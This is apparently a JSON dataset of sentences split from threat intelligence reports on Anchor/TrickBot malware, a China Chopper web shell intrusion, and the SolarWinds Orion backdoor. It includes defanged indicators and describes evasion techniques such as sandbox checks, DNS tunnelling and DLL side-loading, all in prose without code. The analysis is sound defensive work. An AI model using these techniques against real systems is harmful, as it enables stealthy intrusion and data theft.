        "text": "Older and newer versions of Anchor_DNS communicate over DNS.",
        "type": "",
        "report": "r-280",
        "line": 104,
        "index": 787
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S105",
        "text": "However, the newer version described here does not check Internet connectivity using legitimate online web services like ipinfo.io, and instead uses a built-in capability to check for the server\u2019s availability using the ICMP protocol.\n",
        "type": "",
        "report": "r-280",
        "line": 105,
        "index": 788
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S106",
        "text": "Anchor_DNS communicates with the C2 servers over DNS using DNS Tunneling.",
        "type": "",
        "report": "r-280",
        "line": 106,
        "index": 789
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S107",
        "text": "With this technique, Anchor_DNS can transfer data, receive commands, and download an additional payload, as detailed in NTT Security\u2019s report on an older Anchor_DNS sample.\n",
        "type": "",
        "report": "r-280",
        "line": 107,
        "index": 790
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S108",
        "text": "By implementing DNS Tunneling, Anchor_DNS can evade certain security products that might block certain network protocols or overlook DNS traffic.",
        "type": "",
        "report": "r-280",
        "line": 108,
        "index": 791
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S109",
        "text": "During our investigation, we found several unidentified malware samples related to TrickBot infections.",
        "type": "",
        "report": "r-280",
        "line": 109,
        "index": 792
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S110",
        "text": "The malware is dubbed Anchor by its authors and has been active since August 2018.",
        "type": "",
        "report": "r-280",
        "line": 110,
        "index": 793
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S111",
        "text": "Unlike Anchor_DNS, the Anchor malware does not implement communication over DNS.",
        "type": "",
        "report": "r-280",
        "line": 111,
        "index": 794
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S112",
        "text": "However, it does share many behavioral, code, and string similarities with Anchor_DNS and some similarities to TrickBot.\n",
        "type": "",
        "report": "r-280",
        "line": 112,
        "index": 795
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S113",
        "text": "Many Anchor samples have a very low or at times zero detection rate by AV vendors, which could explain the limited reports about this malware.\n",
        "type": "",
        "report": "r-280",
        "line": 113,
        "index": 796
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S114",
        "text": "The malware has both x86 and x64 versions and contains an installer component to install the malware.\n",
        "type": "",
        "report": "r-280",
        "line": 114,
        "index": 797
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S115",
        "text": "Similar to Anchor_DNS, Anchor creates an NTFS ADS file $GUID to store its GUID:\n",
        "type": "",
        "report": "r-280",
        "line": 115,
        "index": 798
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S116",
        "text": "Unlike Anchor_DNS, which stores the information in Base64, Anchor\u2019s GUID is saved in cleartext.\n",
        "type": "",
        "report": "r-280",
        "line": 116,
        "index": 799
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S117",
        "text": "Anchor and older versions of Anchor_DNS implement the exact same self deletion routine using two sets of commands to ensure that the dropper is deleted once the malware was successfully deployed:\n",
        "type": "",
        "report": "r-280",
        "line": 117,
        "index": 800
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S118",
        "text": "Similar to TrickBot, Anchor tries to establish Internet connectivity and the external IP of the target machine prior to communicating with its C2 servers.",
        "type": "",
        "report": "r-280",
        "line": 118,
        "index": 801
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S119",
        "text": "It uses the following hardcoded web services to test connectivity:\n",
        "type": "",
        "report": "r-280",
        "line": 119,
        "index": 802
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S120",
        "text": "Once it has established connectivity, it communicates with a set of hardcoded C2 servers.",
        "type": "",
        "report": "r-280",
        "line": 120,
        "index": 803
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S121",
        "text": "The request and response follow the same C2 communication format as TrickBot.",
        "type": "",
        "report": "r-280",
        "line": 121,
        "index": 804
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S122",
        "text": "Anchor and Anchor_DNS are both directly linked to TrickBot infections, as they are downloaded by TrickBot as secondary payloads.",
        "type": "",
        "report": "r-280",
        "line": 122,
        "index": 805
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S123",
        "text": "There are also several other similarities noted below.\n",
        "type": "",
        "report": "r-280",
        "line": 123,
        "index": 806
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S124",
        "text": "The GUID generation functions for Anchor_DNS and Anchor seem almost identical to that of the GUID generated by TrickBot.",
        "type": "",
        "report": "r-280",
        "line": 124,
        "index": 807
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S125",
        "text": "The GUID follows this pattern:\n",
        "type": "",
        "report": "r-280",
        "line": 125,
        "index": 808
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S126",
        "text": "Both Anchor and older versions of Anchor_DNS use a list of hardcoded online web services to determine Internet connectivity and check the external IP of the infected machine.",
        "type": "",
        "report": "r-280",
        "line": 126,
        "index": 809
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S127",
        "text": "The same list is also used by TrickBot:\n",
        "type": "",
        "report": "r-280",
        "line": 127,
        "index": 810
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S128",
        "text": "checkip.amazonaws.com, ipecho.net, ipinfo.io, api.ipify.org, icanhazip.com, myexternalip.com, wtfismyip.com, and ip.anysrc.net.",
        "type": "",
        "report": "r-280",
        "line": 128,
        "index": 811
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S129",
        "text": "In certain cases, if internet connectivity cannot be reached, Anchor and older versions of Anchor_DNS will delete themselves.\n",
        "type": "",
        "report": "r-280",
        "line": 129,
        "index": 812
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S130",
        "text": "TrickBot, Anchor, and Anchor_DNS typically use a separate C2 infrastructure.",
        "type": "",
        "report": "r-280",
        "line": 130,
        "index": 813
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S131",
        "text": "However, in some instances of this attack, there was C2 server overlap between these infrastructures.",
        "type": "",
        "report": "r-280",
        "line": 131,
        "index": 814
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S132",
        "text": "For example, the IP 23.95.97[.]59, which is hardcoded in an Anchor sample, has also served Anchor_DNS and TrickBot:\n",
        "type": "",
        "report": "r-280",
        "line": 132,
        "index": 815
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S133",
        "text": "Anchor sample with hardcoded IP (SHA-1: 9ebb541dcb24d564448a6f5e00c613b73eba7148)\n",
        "type": "",
        "report": "r-280",
        "line": 133,
        "index": 816
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S134",
        "text": "This above IP address was used by TrickBot to download the squlDLL plugin, which includes email harvesting from SQL servers, screenlocker, and Mimikatz.\n",
        "type": "",
        "report": "r-280",
        "line": 134,
        "index": 817
    },
    {
        "id": "cti_reports_filtered/r-280.md:::S135",
        "text": "The same IP resolved to a domain previously used by Anchor_DNS, chishir[.]com.\n",
        "type": "",
        "report": "r-280",
        "line": 135,
        "index": 818
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S0",
        "text": "The initial indicator of the attack was a malicious web shell that was detected on an IIS server, coming out of the w3wp.exe process.",
        "type": "",
        "report": "r-323",
        "line": 0,
        "index": 819
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S1",
        "text": "An investigation of the web shell, later classified as a modified version of the China Chopper web shell, uncovered several attack phases and TTPs.",
        "type": "",
        "report": "r-323",
        "line": 1,
        "index": 820
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S2",
        "text": "The threat actor was able to leverage the web shell to run reconnaissance commands, steal credentials, and deploy other tools.",
        "type": "",
        "report": "r-323",
        "line": 2,
        "index": 821
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S3",
        "text": "China Chopper is a web shell first discovered in 2012 that is commonly used by malicious Chinese actors.",
        "type": "",
        "report": "r-323",
        "line": 3,
        "index": 822
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S4",
        "text": "It is used to remotely control web servers, and has been used in many attacks against Australian web hosting providers.",
        "type": "",
        "report": "r-323",
        "line": 4,
        "index": 823
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S5",
        "text": "The web shell parameters in this attack match to the China Chopper parameters, as described in FireEye\u2019s analysis of China Chopper.",
        "type": "",
        "report": "r-323",
        "line": 5,
        "index": 824
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S6",
        "text": "This tool has been used by several Chinese-affiliated threat actors, such as APT 27 and APT 40.",
        "type": "",
        "report": "r-323",
        "line": 6,
        "index": 825
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S7",
        "text": "It is important to note that this tool is widely available and can be used by other threat actors.",
        "type": "",
        "report": "r-323",
        "line": 7,
        "index": 826
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S8",
        "text": "The threat actor launched a series of reconnaissance commands to try to obtain and enumerate information about the compromised machine, network architecture, users, and active directory enumeration.",
        "type": "",
        "report": "r-323",
        "line": 8,
        "index": 827
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S9",
        "text": "One of the reconnaissance commands was to run a modified nbtscan tool (\"NetBIOS nameserver scanner\") to identify available NetBIOS name servers locally or over the network.",
        "type": "",
        "report": "r-323",
        "line": 9,
        "index": 828
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S10",
        "text": "Nbtscan has been used by APT10 in Operation Cloud Hopper to search for services of interest across the IT estate and footprint endpoints of interest.",
        "type": "",
        "report": "r-323",
        "line": 10,
        "index": 829
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S11",
        "text": "It is also capable of identifying system information.",
        "type": "",
        "report": "r-323",
        "line": 11,
        "index": 830
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S12",
        "text": "Following the reconnaissance phase, the threat actor attempted to dump credentials stored on the compromised machines.",
        "type": "",
        "report": "r-323",
        "line": 12,
        "index": 831
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S13",
        "text": "The most common credential stealing tool used by the threat actor was a modified mimikatz that dumps NTLM hashes.",
        "type": "",
        "report": "r-323",
        "line": 13,
        "index": 832
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S14",
        "text": "This version of mimikatz did not require any command line arguments, most likely in an attempt to avoid detection based on command-line auditing.",
        "type": "",
        "report": "r-323",
        "line": 14,
        "index": 833
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S15",
        "text": "The dumped hashes were used to authenticate to other machines via pass the hash.",
        "type": "",
        "report": "r-323",
        "line": 15,
        "index": 834
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S16",
        "text": "We renamed this sample to maybemimi.exe.\n",
        "type": "",
        "report": "r-323",
        "line": 16,
        "index": 835
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S17",
        "text": "Reverse engineering shows the similarity between maybemimi.exe and mimikatz.\n",
        "type": "",
        "report": "r-323",
        "line": 17,
        "index": 836
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S18",
        "text": "In order to obtain credentials, the threat actor used another technique that can be seen in the below screenshots.",
        "type": "",
        "report": "r-323",
        "line": 18,
        "index": 837
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S19",
        "text": "They dumped specific hives from the Windows Registry, such as the SAM hive, which contains password hashes.\n",
        "type": "",
        "report": "r-323",
        "line": 19,
        "index": 838
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S20",
        "text": "Once the threat actor mapped the network and obtained credentials (through net use), they began to move laterally.",
        "type": "",
        "report": "r-323",
        "line": 20,
        "index": 839
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S21",
        "text": "They were able to compromise critical assets including production servers and database servers, and they even managed to gain full control of the Domain Controller.",
        "type": "",
        "report": "r-323",
        "line": 21,
        "index": 840
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S22",
        "text": "The threat actor relied on WMI and PsExec to move laterally and install their tools across multiple assets.\n",
        "type": "",
        "report": "r-323",
        "line": 22,
        "index": 841
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S23",
        "text": "The following example demonstrates how the threat actor moved laterally from the first machine, compromised by the modified version of the China Chopper web shell, to other machines inside the network.",
        "type": "",
        "report": "r-323",
        "line": 23,
        "index": 842
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S24",
        "text": "The threat actor abused the stolen credentials to create rogue, high-privileged domain user accounts which they then used to take malicious action.",
        "type": "",
        "report": "r-323",
        "line": 24,
        "index": 843
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S25",
        "text": "By creating these accounts, they ensured they would maintain access between different waves of the attack.",
        "type": "",
        "report": "r-323",
        "line": 25,
        "index": 844
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S26",
        "text": "Once the threat actor regains their foothold, they already have access to a high-privileged domain user account.",
        "type": "",
        "report": "r-323",
        "line": 26,
        "index": 845
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S27",
        "text": "This significantly reduces the \u201cnoise\u201d of having to use credential dumpers repeatedly, which helped them evade detection.",
        "type": "",
        "report": "r-323",
        "line": 27,
        "index": 846
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S28",
        "text": "A second method the threat actor used to maintain access across the compromised assets was through the deployment of the PoisonIvy RAT (PIVY).",
        "type": "",
        "report": "r-323",
        "line": 28,
        "index": 847
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S29",
        "text": "This infamous RAT has been associated with many different Chinese threat actors, including APT10, APT1, and DragonOK.",
        "type": "",
        "report": "r-323",
        "line": 29,
        "index": 848
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S30",
        "text": "It is a powerful, multi-featured RAT that lets a threat actor take total control over a machine.",
        "type": "",
        "report": "r-323",
        "line": 30,
        "index": 849
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S31",
        "text": "Among its most notable features are:\n",
        "type": "",
        "report": "r-323",
        "line": 31,
        "index": 850
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S32",
        "text": "- Registry Editor\n",
        "type": "",
        "report": "r-323",
        "line": 32,
        "index": 851
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S33",
        "text": "- Screenshot Grabber\n",
        "type": "",
        "report": "r-323",
        "line": 33,
        "index": 852
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S34",
        "text": "- Credential Stealer\n",
        "type": "",
        "report": "r-323",
        "line": 34,
        "index": 853
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S35",
        "text": "- Interactive Shell\n",
        "type": "",
        "report": "r-323",
        "line": 35,
        "index": 854
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S36",
        "text": "- File Manager with Upload and Download Support\n",
        "type": "",
        "report": "r-323",
        "line": 36,
        "index": 855
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S37",
        "text": "- Process Monitor\n",
        "type": "",
        "report": "r-323",
        "line": 37,
        "index": 856
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S38",
        "text": "- Keylogging and Various other Surveillance Features\n",
        "type": "",
        "report": "r-323",
        "line": 38,
        "index": 857
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S39",
        "text": "We assume the threat actor used PoisonIvy for keylogging and other surveillance features, as they had that functionality available to them as shown in the screenshot above.\n",
        "type": "",
        "report": "r-323",
        "line": 39,
        "index": 858
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S40",
        "text": "The strain of PIVY in this attack used a DLL side-loading technique to stealthily load itself into memory.",
        "type": "",
        "report": "r-323",
        "line": 40,
        "index": 859
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S41",
        "text": "To accomplish this, it exploited a trusted and signed application.",
        "type": "",
        "report": "r-323",
        "line": 41,
        "index": 860
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S42",
        "text": "The PIVY payload was dropped along with the trusted and signed Samsung tool (RunHelp.exe) in the following manner:\n",
        "type": "",
        "report": "r-323",
        "line": 42,
        "index": 861
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S43",
        "text": "- nullsoft installer package (NSIS) was created with a legitimate, signed Samsung tool in it. \n",
        "type": "",
        "report": "r-323",
        "line": 43,
        "index": 862
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S44",
        "text": "- Once executed, the installer script within the NSIS package extracted the Samsung tool and added a fake DLL with the same name as a legitimate DLL (ssMUIDLL.dll), which is required by the application.",
        "type": "",
        "report": "r-323",
        "line": 44,
        "index": 863
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S45",
        "text": "- The DLL contains a PIVY stager, which is then loaded by the Samsung tool. \n",
        "type": "",
        "report": "r-323",
        "line": 45,
        "index": 864
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S46",
        "text": "- After the fake DLL was loaded by the Samsung tool, it decrypted a blob payload in the same folder, which contains the actual PIVY payload. \n",
        "type": "",
        "report": "r-323",
        "line": 46,
        "index": 865
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S47",
        "text": "- It was able to achieve persistence by creating a rogue scheduled task.\n",
        "type": "",
        "report": "r-323",
        "line": 47,
        "index": 866
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S48",
        "text": "PIVY\u2019s use of DLL side-loading to abuse Samsung tools is not new, and has been reported previously by Palo Alto.",
        "type": "",
        "report": "r-323",
        "line": 48,
        "index": 867
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S49",
        "text": "In 2016 it was used to attack pro-democratic activists in Hong Kong, most probably by Chinese threat actors.\n",
        "type": "",
        "report": "r-323",
        "line": 49,
        "index": 868
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S50",
        "text": "\u26a0\ufe0f Note: Our team has reached out to and advised the targeted organizations on active containment actions.\n",
        "type": "",
        "report": "r-323",
        "line": 50,
        "index": 869
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S51",
        "text": "In later stages of the attack, the threat actor deployed two other custom-built web shells.",
        "type": "",
        "report": "r-323",
        "line": 51,
        "index": 870
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S52",
        "text": "From these web shells, they launched reconnaissance commands, stole data, and dropped additional tools including portqry.exe, renamed cmd.exe, winrar, and the notorious hTran.\n",
        "type": "",
        "report": "r-323",
        "line": 52,
        "index": 871
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S53",
        "text": "The threat actor exfiltrated stolen data using multiple different channels including web shells and hTran.\n",
        "type": "",
        "report": "r-323",
        "line": 53,
        "index": 872
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S54",
        "text": "In an attempt to hide the contents of the stolen data, the threat actor used winrar to compress and password-protect it.",
        "type": "",
        "report": "r-323",
        "line": 54,
        "index": 873
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S55",
        "text": "The winrar binaries and compressed data were found mostly in the Recycle Bin folder, a TTP that was previously observed in APT10-related attacks, as well as others.",
        "type": "",
        "report": "r-323",
        "line": 55,
        "index": 874
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S56",
        "text": "This threat actor is known to stage the data in multi-part archives before exfiltration.",
        "type": "",
        "report": "r-323",
        "line": 56,
        "index": 875
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S57",
        "text": "The threat actor used the following commands to compress the data.\n",
        "type": "",
        "report": "r-323",
        "line": 57,
        "index": 876
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S58",
        "text": "The contents of the compressed data was crucial in understanding the threat actor\u2019s motivation for the attack, as well as what type of information they were after.\n",
        "type": "",
        "report": "r-323",
        "line": 58,
        "index": 877
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S59",
        "text": "In order to exfiltrate data from a network segment not connected to the Internet, the threat actor deployed a modified version of hTran.",
        "type": "",
        "report": "r-323",
        "line": 59,
        "index": 878
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S60",
        "text": "This \u2018connection bouncer\u2019 tool lets the threat actor redirect ports and connections between different networks and obfuscate C2 server traffic.",
        "type": "",
        "report": "r-323",
        "line": 60,
        "index": 879
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S61",
        "text": "There have been numerous reports of hTran being used by different Chinese threat actors, including: APT3, APT27 and DragonOK.",
        "type": "",
        "report": "r-323",
        "line": 61,
        "index": 880
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S62",
        "text": "The threat actor made some modifications to the original source code of hTran.",
        "type": "",
        "report": "r-323",
        "line": 62,
        "index": 881
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S63",
        "text": "Many strings, including the debug messages, were intentionally changed and obfuscated in an attempt to evade detection and thwart efforts to identify the malware by antivirus and researchers.\n",
        "type": "",
        "report": "r-323",
        "line": 63,
        "index": 882
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S64",
        "text": "Since the original source code for hTran is publicly available, we were able to compare the debug output to the original source code to show that it has indeed been modified.\n",
        "type": "",
        "report": "r-323",
        "line": 64,
        "index": 883
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S65",
        "text": "printf is being called (dubbed by us as \u201clooks_like_printf\u201d) with output \u201cC e.\u201d.",
        "type": "",
        "report": "r-323",
        "line": 65,
        "index": 884
    },
    {
        "id": "cti_reports_filtered/r-323.md:::S66",
        "text": "By looking at the original source code, we were able to identify that this is supposed to be \u201cConnect error\u201d.",
        "type": "",
        "report": "r-323",
        "line": 66,
        "index": 885
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S0",
        "text": "The attackers inserted malicious code into SolarWinds.Orion.Core.BusinessLayer.dll, a code library belonging to the SolarWinds Orion Platform.",
        "type": "",
        "report": "r-326",
        "line": 0,
        "index": 886
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S1",
        "text": "The attackers had to find a suitable place in this DLL component to insert their code.",
        "type": "",
        "report": "r-326",
        "line": 1,
        "index": 887
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S2",
        "text": "Ideally, they would choose a place in a method that gets invoked periodically, ensuring both execution and persistence, so that the malicious code is guaranteed to be always up and running.",
        "type": "",
        "report": "r-326",
        "line": 2,
        "index": 888
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S3",
        "text": "Such a suitable location turns out to be a method named RefreshInternal.\n",
        "type": "",
        "report": "r-326",
        "line": 3,
        "index": 889
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S4",
        "text": "The modification to this function is very lightweight and could be easily overlooked\u2014all it does is to execute the method OrionImprovementBusinessLayer.Initialize within a parallel thread, so that the normal execution flow of RefreshInternal is not altered.\n",
        "type": "",
        "report": "r-326",
        "line": 4,
        "index": 890
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S5",
        "text": "Why was this method chosen rather than other ones?",
        "type": "",
        "report": "r-326",
        "line": 5,
        "index": 891
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S6",
        "text": "A quick look at the architecture of this DLL shows that RefreshInternal is part of the class SolarWinds.Orion.Core.BusinessLayer.BackgroundInventory.InventoryManager and is invoked by a sequence of methods that can be traced back to the CoreBusinessLayerPlugin class.",
        "type": "",
        "report": "r-326",
        "line": 6,
        "index": 892
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S7",
        "text": "The purpose of this class, which initiates its execution with a method named Start (likely at an early stage when the DLL is loaded), is to initialize various other components and schedule the execution of several tasks.",
        "type": "",
        "report": "r-326",
        "line": 7,
        "index": 893
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S8",
        "text": "Among those tasks is Background Inventory, which ultimately starts the malicious code.",
        "type": "",
        "report": "r-326",
        "line": 8,
        "index": 894
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S9",
        "text": "The functionality of the backdoor resides entirely in the class OrionImprovementBusinessLayer, comprising 13 subclasses and 16 methods.",
        "type": "",
        "report": "r-326",
        "line": 9,
        "index": 895
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S10",
        "text": "Its name blends in with the rest of the legitimate code.",
        "type": "",
        "report": "r-326",
        "line": 10,
        "index": 896
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S11",
        "text": "The threat actors were savvy enough to avoid give-away terminology like \u201cbackdoor\u201d, \u201ckeylogger\u201d, etc., and instead opted for a more neutral jargon.",
        "type": "",
        "report": "r-326",
        "line": 11,
        "index": 897
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S12",
        "text": "At first glance, the code in this DLL looks normal and doesn\u2019t raise suspicions, which could be part of the reason why the insertion of malicious code was undetected for months, especially if the code for this DLL was not frequently updated.",
        "type": "",
        "report": "r-326",
        "line": 12,
        "index": 898
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S13",
        "text": "To have some minimal form of obfuscation from prying eyes, the strings in the backdoor are compressed and encoded in Base64, or their hashes are used instead.\n",
        "type": "",
        "report": "r-326",
        "line": 13,
        "index": 899
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S14",
        "text": "The Initialize method is the de facto execution entry point of the backdoor.",
        "type": "",
        "report": "r-326",
        "line": 14,
        "index": 900
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S15",
        "text": "It carries out several checks to verify that it is running in a real victim\u2019s environment:\n",
        "type": "",
        "report": "r-326",
        "line": 15,
        "index": 901
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S16",
        "text": "- It verifies that the process hosting the malicious DLL is named solarwinds.businesslayerhost.exe\n",
        "type": "",
        "report": "r-326",
        "line": 16,
        "index": 902
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S17",
        "text": "- It checks that the last write-time of the malicious DLL is at least 12 to 14 days earlier\n",
        "type": "",
        "report": "r-326",
        "line": 17,
        "index": 903
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S18",
        "text": "- It delays execution by random amounts of time\n",
        "type": "",
        "report": "r-326",
        "line": 18,
        "index": 904
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S19",
        "text": "- It verifies that the domain name of the current device meets the following conditions: \n",
        "type": "",
        "report": "r-326",
        "line": 19,
        "index": 905
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S20",
        "text": "  - The domain must not contain certain strings; the check for these strings is implemented via hashes, so at this time the domain names that are block-listed are unknown \n",
        "type": "",
        "report": "r-326",
        "line": 20,
        "index": 906
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S21",
        "text": "  - The domain must not contain \u201csolarwinds\u201d \n",
        "type": "",
        "report": "r-326",
        "line": 21,
        "index": 907
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S22",
        "text": "  - The domain must not match the regular expression (?i)([^a-z]|^)(test)([^a-z]|$), or in simpler terms, it must not look like a test domain\n",
        "type": "",
        "report": "r-326",
        "line": 22,
        "index": 908
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S23",
        "text": "- It checks that there are no running processes related to security-related software (e.g., Windbg, Autoruns, Wireshark)\n",
        "type": "",
        "report": "r-326",
        "line": 23,
        "index": 909
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S24",
        "text": "- It checks that there are no drivers loaded from security-related software (e.g., groundling32.sys)\n",
        "type": "",
        "report": "r-326",
        "line": 24,
        "index": 910
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S25",
        "text": "- It checks that the status of certain services belonging to security-related software meets certain conditions (e.g., windefend, sense, cavp)\n",
        "type": "",
        "report": "r-326",
        "line": 25,
        "index": 911
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S26",
        "text": "- It checks that the host \u201capi.solarwinds.com\u201d resolves to an expected IP address\n",
        "type": "",
        "report": "r-326",
        "line": 26,
        "index": 912
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S27",
        "text": "If any of these checks fail, the backdoor terminates.",
        "type": "",
        "report": "r-326",
        "line": 27,
        "index": 913
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S28",
        "text": "All these inspections are carried out to avoid exposing the malicious functionality to unwanted environments, such as test networks or machines belonging to SolarWinds.\n",
        "type": "",
        "report": "r-326",
        "line": 28,
        "index": 914
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S29",
        "text": "After the extensive validation described above, the backdoor enters its main execution stage.",
        "type": "",
        "report": "r-326",
        "line": 29,
        "index": 915
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S30",
        "text": "At its core, the backdoor is a very standard one that receives instructions from the C2 server, executes those instructions, and sends back information.",
        "type": "",
        "report": "r-326",
        "line": 30,
        "index": 916
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S31",
        "text": "The type of commands that can be executed range from manipulating of registry keys, to creating processes, and deleting files, etc., effectively providing the attackers with full access to the device, especially since it\u2019s executing from a trusted, signed binary.\n",
        "type": "",
        "report": "r-326",
        "line": 31,
        "index": 917
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S32",
        "text": "In its first step, the backdoor initiates a connection to a predefined C2 server to report some basic information about the compromised system and receive the first commands.",
        "type": "",
        "report": "r-326",
        "line": 32,
        "index": 918
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S33",
        "text": "The C2 domain is composed of four different parts: three come from strings that are hardcoded in the backdoor, and one component is generated dynamically based on some unique information extracted from the device.",
        "type": "",
        "report": "r-326",
        "line": 33,
        "index": 919
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S34",
        "text": "This means that every affected device generates a different subdomain to contact (and possibly more than one).",
        "type": "",
        "report": "r-326",
        "line": 34,
        "index": 920
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S35",
        "text": "Here\u2019s an example of a generated domain:\n",
        "type": "",
        "report": "r-326",
        "line": 35,
        "index": 921
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S36",
        "text": "The dynamically generated portion of the domain is the interesting part.",
        "type": "",
        "report": "r-326",
        "line": 36,
        "index": 922
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S37",
        "text": "It is computed by hashing the following data:\n",
        "type": "",
        "report": "r-326",
        "line": 37,
        "index": 923
    },
    {
        "id": "cti_reports_filtered/r-326.md:::S38",
        "text": "- The physical address of the network interface\n",
        "type": "",
        "report": "r-326",
        "line": 38,
        "index": 924
    },
